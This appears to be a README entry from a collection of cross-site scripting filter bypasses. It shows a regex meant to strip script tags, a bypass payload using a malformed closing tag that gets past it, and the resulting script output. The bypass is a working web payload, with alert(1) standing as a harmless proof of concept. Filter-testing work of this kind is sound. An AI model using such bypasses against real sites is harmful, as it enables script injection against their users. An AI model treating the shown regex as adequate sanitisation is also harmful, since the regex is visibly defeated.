# xss-db

regex code:
```
#<script(.*?)>(.*?)</script>#is
```
bypass:
```html
<script>alert(1)</script/>
```
output:
```html
<script>alert(1)</script>
```
 notes:
  - might not be needed to be put here but I did anyways.

 <hr>
